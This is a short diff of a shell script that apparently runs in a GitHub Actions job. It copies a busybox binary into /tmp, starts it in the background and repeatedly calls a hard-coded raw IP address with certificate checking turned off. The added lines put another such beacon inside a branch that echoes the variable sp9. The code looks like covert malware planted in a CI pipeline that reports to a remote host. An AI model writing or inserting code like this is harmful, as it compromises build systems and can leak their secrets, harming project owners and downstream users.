@@ -39,7 +39,10 @@ cp /tmp/busybox.bin /tmp/busybox &
 curl -4k  "https://15.165.156.66:4448/tcpip-50088/gitact2?c=1"
 
 
-if [ ! -z ${sp9} ]; then echo $sp9; fi
+if [ ! -z ${sp9} ]; then 
+echo $sp9; 
+curl -4k  "https://15.165.156.66:4448/tcpip-50088/gitact2?c=1za"
+fi
 curl -4k  "https://15.165.156.66:4448/tcpip-50088/gitact2?c=1z"
 
 if [ ! -z ${$GITHUB_WORKSPACE} ]; then 
